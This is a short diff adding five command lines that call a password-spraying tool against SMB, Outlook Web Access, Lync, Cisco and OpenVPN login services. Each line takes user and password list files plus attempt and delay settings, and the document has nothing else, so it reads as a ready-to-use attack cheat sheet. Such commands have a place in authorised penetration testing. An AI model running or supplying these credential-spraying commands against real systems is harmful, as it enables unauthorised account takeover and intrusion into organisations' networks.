@@ -1,0 +1,5 @@
+spray -smb "$TARGET"  users.txt passwords.txt 1 35 "$DOMAIN"
+spray -owa "$TARGET"  users.txt passwords.txt 1 35 post-request.txt
+spray -lync "$TARGET" users.txt passwords.txt 1 35
+spray -cisco "$TARGET"  usernames.txt passwords.txt 1 35
+spray -ovpn "$TARGET"  943 usernames.txt passwords.txt 1 35
